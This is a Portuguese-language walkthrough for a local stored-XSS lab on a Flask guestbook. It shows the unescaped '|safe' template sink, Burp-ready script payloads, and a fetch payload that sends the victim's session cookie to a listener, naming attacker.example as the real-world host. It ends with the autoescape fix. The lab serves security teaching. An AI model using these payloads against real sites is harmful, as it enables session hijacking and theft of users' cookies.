# Walkthrough — xss-stored

## 1. Contexto

A app é um guestbook (mural de recados). Em `/` você vê todos os comentários já deixados — do mais novo pro mais antigo, cada linha mostrando o author, uma data e a mensagem — com um formulário pequeno no topo pra deixar o seu. Submeter o form dispara um `POST /comment`; o servidor salva o comentário numa tabela SQLite `comments` e te redireciona de volta pro `GET /` (padrão Post/Redirect/Get), onde o seu comentário novo agora aparece na lista junto com o dos outros.

Dois comentários de seed vêm com o lab (de `alice` e `bob`, datados com alguns dias de diferença) pra a página parecer um guestbook com histórico em vez de um form vazio.

Mais uma coisa acontece em todo `GET /`: o servidor seta um cookie, `session=fake-session-token-abc123`. Ele não autentica nada — é um adereço de lab — mas é um cookie de verdade no seu browser, e **não** é `HttpOnly`, o que importa no Passo 3.

> **Uma nota sobre o que você vai observar, e onde.** Diferente dos átomos de SQLi, este não é trabalhado inteiramente no Burp. O Burp não executa JavaScript, e stored XSS só *se prova* quando um script roda num browser. Então a exploração abaixo usa duas ferramentas, e a divisão não é acidental — ela espelha o próprio ataque: o **Burp planta** o payload (a jogada do atacante) e um **browser observa** ele disparar (a jogada da vítima). Atacante e vítima são partes diferentes, em requests diferentes, em momentos diferentes — essa é a ideia inteira do stored XSS, e você sente isso nas ferramentas.

## 2. Ache o bug

A source e o sink estão em arquivos diferentes — e, diferente do reflected XSS, em *requests* diferentes. A view `POST /comment` em [`vulnerable/app.py`](./vulnerable/app.py) salva o comentário:

```python
@app.route("/comment", methods=["POST"])
def comment():
    author = request.form.get("author", "")
    body = request.form.get("body", "")
    conn = sqlite3.connect(DB_PATH)
    # Parameterized insert: storing the payload is NOT the bug (no SQLi here).
    conn.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))
    ...
```

Repare nos placeholders `?`: o insert é parametrizado, então **não há SQL injection** aqui. O payload é armazenado *com segurança*. O bug não é como o dado entra — é como ele volta a sair. O sink está a um arquivo de distância, em [`vulnerable/templates/index.html`](./vulnerable/templates/index.html), no loop que renderiza os comentários salvos:

```html
<li><strong>{{ comment.author }}</strong> &middot; {{ comment.created_at }} &mdash; {{ comment.body|safe }}</li>
```

`{{ comment.body }}` sozinho seria seguro — o Jinja faz autoescape por default, convertendo `<`, `>`, `&`, `'` e `"` em entidades HTML antes de chegarem na response. O filter `|safe` desliga isso explicitamente pro body, dizendo pro Jinja "isso já é HTML confiável, emite na íntegra". Não é: veio de `request.form` numa request diferente e tá guardado no banco desde então. O `author` e o `created_at` ao lado são renderizados normalmente (escapados) — o body é o único sink.

Mesmas lições do `xss-reflected`, afiadas:

- A source (`app.py`, o `POST`) e o sink (`index.html`, o `GET`) estão em arquivos diferentes **e requests diferentes**. Uma review que lê só o caminho de escrita vê um insert parametrizado limpo e segue em frente.
- `|safe` é o red flag. `grep -rn '|safe' templates/` é a auditoria de primeira passada barata, aqui como lá.
- O dado é armazenado direito — é o *output* que está sem escape. Stored XSS vive no render, não na escrita.

## 3. Exploração via Burp Suite + browser (trilha principal)

Configure o Burp Proxy, aponte o browser pra ele e visite <http://127.0.0.1:8008/>. Submeta um comentário descartável pelo form pra o Burp capturar um `POST /comment` em **Proxy → HTTP history**; clique com o direito nele e escolha **Send to Repeater**. Esse POST é o instrumento do atacante — você edita o corpo dele e reenvia pra plantar payloads com controle total sobre os bytes exatos.

### Uma nota sobre encoding do corpo

O corpo do `POST /comment` é `application/x-www-form-urlencoded`: `author=<...>&body=<...>`. Ao editar à mão no Repeater, caracteres que são estruturais nesse formato precisam de encode dentro de um valor:

- `&` (`%26`) separa campos e `=` (`%3D`) separa chave de valor — um literal desses dentro do seu payload seria mal-parseado.
- **`+` precisa ser `%2B`.** Num corpo form-urlencoded um `+` literal é decodado como *espaço*. O payload do Passo 3 contém `'+document.cookie`; mandado cru, o servidor armazena `' document.cookie` e o JavaScript quebra. Esse é o motivo número um de um payload de XSS colado falhar silenciosamente num corpo de POST.

Os `<`, `>`, `'`, `/` de um payload de XSS não são estruturais do form e podem viajar como estão, mas o hábito seguro é colar o payload decoded no Repeater, selecionar o valor e apertar **Ctrl+U** — o Burp encoda tudo, inclusive o `+`. Cada passo mostra um **Body (decoded)** pra leitura e um **Body (Burp-ready)** pra colar. (O form do browser encoda tudo pra você; a armadilha do `+` só morde quando você monta o corpo cru no Burp.)

### Passo 1 — Plantar uma vez, disparar em outro lugar

Este passo único é o loop stored inteiro: o atacante planta numa request (1a), e uma request *diferente* de uma pessoa *diferente* dispara (1b).

**1a — plantar o payload (atacante, no Burp).** No `POST /comment` do Repeater, coloque no corpo um payload de prova e envie.

Body (decoded):

```
author=mallory&body=<script>alert(document.domain)</script>
```

Body (Burp-ready):

```
author=mallory&body=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
```

A response é um **302 redirect** pra `/`. Leia com atenção: a resposta do *próprio atacante* é **inerte** — nenhum alert, nada executa, o payload nem é ecoado de volta. Ele foi pro armazenamento. (Contraste com o `xss-reflected`, onde o payload voltava direto na resposta do próprio atacante e dispararia ali mesmo. Aqui a request do atacante é um dead drop.)

**1b — disparar (vítima, no browser).** Agora pare de ser o atacante. Abra <http://127.0.0.1:8008/> no seu browser como um visitante qualquer, que nunca viu a request da mallory.

O alert dispara — `127.0.0.1:8008`. O script que a mallory *armazenou* está rodando no **seu** browser, numa request que **você** fez, num momento que **você** escolheu; o atacante já foi embora há tempo. Esse intervalo — atacante planta, vítima dispara, requests diferentes, momentos diferentes — é o stored XSS numa tela só.

Por que o `<script>` inline roda: o servidor coloca ele no **HTML inicial** do `GET /`, que o browser parseia de cima pra baixo no load, executando inline script tags conforme encontra. (Em DOM-based XSS — onde o sink é JavaScript client-side escrevendo no DOM *depois* do load — os browsers deliberadamente não executam `<script>` inserido via `innerHTML`, e esse mesmo payload não faria nada silenciosamente. Mesma classe, sink diferente; o payload tem que casar com o sink.)

### Passo 2 — Persistência: dispara pra todo visitante, sempre

Não poste nada novo. Só recarregue <http://127.0.0.1:8008/> — ou abra numa segunda aba, ou outro profile de browser, representando um visitante genuinamente diferente. O alert dispara **de novo**, sem nenhuma request nova do atacante.

Isto isola o que o bug realmente é — e o que ele *não* é. Olhe a URL: um `http://127.0.0.1:8008/` puro, sem query string, nada malicioso na request. E mesmo assim o script roda. Então isto **não** é reflection — não há nada na *sua* request pra refletir. O payload está vindo do **banco**, re-servido em toda visita, pra todo visitante, indefinidamente, até alguém apagar o comentário. Reflected XSS precisa que a vítima clique num link preparado pelo atacante carregando o payload; stored XSS precisa que a vítima só faça uma coisa: visitar uma página em que ela já confia.

### Passo 3 — Impacto real: roubar o cookie da vítima

Um alert prova execução; não mostra impacto. Troque o payload de prova por um que exfiltra o cookie de session da vítima pra um servidor que você controla.

> **Suba um listener primeiro.** Num terminal separado:
>
> ```bash
> python3 -m http.server 9000
> ```
>
> Um servidor HTTP de uma linha pra capturar callbacks é uma ferramenta de pentest padrão, não só um truque de lab — você vai reusar isso em XSS, SSRF, LFI e qualquer blind/out-of-band injection onde o dado tem que voltar por um canal lateral. (Se a porta 9000 estiver ocupada, use qualquer porta livre e ajuste o payload.)

**Plantar o payload de exfil (atacante, no Burp).**

Body (decoded):

```
author=mallory&body=<script>fetch('http://127.0.0.1:9000/?c='+document.cookie)</script>
```

Body (Burp-ready):

```
author=mallory&body=%3Cscript%3Efetch%28%27http%3A%2F%2F127.0.0.1%3A9000%2F%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
```

(Atenção ao `%2B` — veja a nota de encoding acima. Um `+` cru aqui vira espaço e o script quebra.)

**Disparar (vítima, no browser).** Com o listener no ar, abra <http://127.0.0.1:8008/>. A página carrega normalmente, e o script armazenado dispara silenciosamente um `fetch` carregando `document.cookie`. No terminal do listener aparece uma linha de log:

```
127.0.0.1 - - [..] "GET /?c=session=fake-session-token-abc123 HTTP/1.1" 200 -
```

Aí está — o cookie de session da vítima, entregue ao servidor do atacante. Isto rodou no browser da **vítima**, não no do atacante; num engagement real o host seria a máquina do atacante (`//attacker.example`), não localhost, e o atacante então faria replay desse cookie pra sequestrar a session da vítima. (O payload continua demonstrativo — lê o cookie, manda, nada destrutivo.)

Duas coisas que vale saber, ambas reutilizáveis além deste lab:

- **CORS não impede a exfil.** O `fetch` é cross-origin (`:8008` → `:9000`), então o browser pode bloquear o atacante de *ler a resposta* — mas a request **sai** do browser do mesmo jeito com o dado roubado na query string, e ainda cai no log do listener. Exfiltração-via-URL não precisa da resposta, só da request de saída, então CORS é irrelevante pra ela.
- **Sem bloqueio de Mixed Content.** A app é HTTP puro (sem TLS), então um `fetch` pra `http://127.0.0.1:9000` não é bloqueado. A partir de uma página HTTPS o browser bloquearia uma request `http://` como mixed content, e você mandaria pra `https://` ou pra um `//host` protocol-relative.

(A essa altura o alert do Passo 1 continua armazenado e também dispara em cada visita — persistência, de novo. Pra resetar só pros comentários de seed: `./atom down xss-stored && ./atom up xss-stored`.)

### Por que isso é stored, não reflected

No `xss-reflected` o payload ia na query string de uma única request e voltava naquela mesma response — o atacante via o próprio alert, e uma vítima só era atingida se clicasse num link preparado pelo atacante (engenharia social). Aqui o atacante plantou um `POST` e foi embora; o payload vive no banco, e todo visitante que abre o guestbook — sem clicar em nada — executa ele, persistentemente. Mesmo sink (`|safe`), mesmo fix (autoescape), mesma classe. Só a entrega mudou: de um eco efêmero na sua própria resposta pra um payload persistente na resposta de todo mundo. E o que ele rouba não é dado server-side como o SQLi exfiltra uma senha — é a própria session da vítima, do browser dela.

## 4. Por que o fix funciona

Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança de uma linha. Em resumo: o template fixed larga o `|safe` e renderiza `{{ comment.body }}` via autoescape default do Jinja, então `<`, `>`, `&`, `'`, `"` viram entidades HTML no render. Aponte o browser pra app fixed na **8108**, plante qualquer payload de cima e recarregue: o comentário aparece como texto visível — `<script>alert(document.domain)</script>` impresso na tela, angle brackets e tudo — e nada executa. O listener fica silencioso.

O cookie continua sendo setado na 8108, e continua não-`HttpOnly` — porque o cookie nunca foi o bug, e manter exatamente uma coisa diferente entre as duas apps (o escape) deixa a lição limpa. Setar `HttpOnly` valeria como defense-in-depth — impediria o `document.cookie` de ler a session, derrotando *este* payload de exfil específico mesmo que um XSS escapasse — mas não é o fix, e não pararia o XSS em si (o atacante ainda poderia desfigurar a página, agir como o usuário, ou ler o DOM). O fix é escapar o output; o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) cobre a camada de HttpOnly por completo.
